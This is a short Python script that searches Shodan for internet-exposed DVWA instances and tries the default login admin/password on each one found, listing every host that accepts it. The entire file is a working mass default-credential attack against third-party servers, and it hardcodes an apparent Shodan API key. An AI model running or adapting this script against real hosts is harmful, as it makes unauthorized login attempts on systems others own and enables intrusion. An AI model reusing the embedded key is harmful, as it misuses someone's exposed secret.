import shodan
import time
import requests
import re

SHODAN_API_KEY = "FS7vJPBWZSaSvDEH4I4YXjaYTiDU7HCl"
api = shodan.Shodan(SHODAN_API_KEY)

def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            print(f"Error: {e}")
            time.sleep(5)

def has_valid_credentials(instance):
    sess = requests.Session()
    proto = 'https' if instance.get('ssl') else 'http'
    try:
        res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
    except requests.exceptions.ConnectionError:
        return False
    if res.status_code != 200:
        print(f"[-] Got HTTP status code {res.status_code}, expected 200")
        return False
    # Search for CSRF Token
    match = re.search(r"user_token value='([0-9a-f]+)'", res.text)
    if not match:
        print(f"[-] CSRF token not found for {instance['ip_str']}:{instance['port']}")
        return False
    token = match.group(1)
    res = sess.post(
        f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
        data=f"username=admin&password=password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )

    # Login check
    if res.status_code == 302 and res.headers.get('Location') == 'index.php':
        return True
    else:
        return False

# Process a single page of Shodan results
def process_page(page):
    result = []
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] Valid credentials at: {instance['ip_str']}:{instance['port']}")
            result.append(instance)
    return result

# Iterate over each page of Shodan results
def query_shodan(query):
    print("[*] Querying the first page")
    first_page = request_page_from_shodan(query)
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2

    while already_processed < total:
        print(f"[*] Querying page {page}")
        next_page = request_page_from_shodan(query, page=page)
        already_processed += len(next_page['matches'])
        result += process_page(next_page)
        page += 1

    return result

# Search for DVWA (vulnerable) instances
res = query_shodan('title:dvwa')
print(res)
